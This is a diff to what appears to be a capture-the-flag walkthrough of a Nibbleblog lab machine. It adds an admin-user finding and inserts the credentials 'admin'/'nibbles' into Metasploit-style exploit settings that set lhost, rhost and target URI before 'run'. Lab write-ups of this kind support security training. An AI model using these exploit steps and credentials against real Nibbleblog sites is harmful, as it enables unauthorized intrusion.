@@ -87,8 +87,8 @@ Results:
 ![image](https://cdn-images-1.medium.com/max/1000/1*8W4FF3LwC2N5AqNdcplJKA.png)
 
 
-After traveling betweem the directories within /admin, I didn't find anything there. 
-But there is README file that includes the version of the nibbleblog service.
+After traveling betweem the directories within /admin, I found a file that tells me there is admin user. 
+In addition, there is README file that includes the version of the nibbleblog service.
 
 
 ![image](https://cdn-images-1.medium.com/max/1000/1*Sw-slPkN3-mQNnwhOMbfnw.png)
@@ -129,6 +129,10 @@ set lhost <your-ip>
 set rhost <target-machine>
 
 set targeturi /nibbleblog/
+
+set username admin 
+
+set password nibbles
 
 run
 
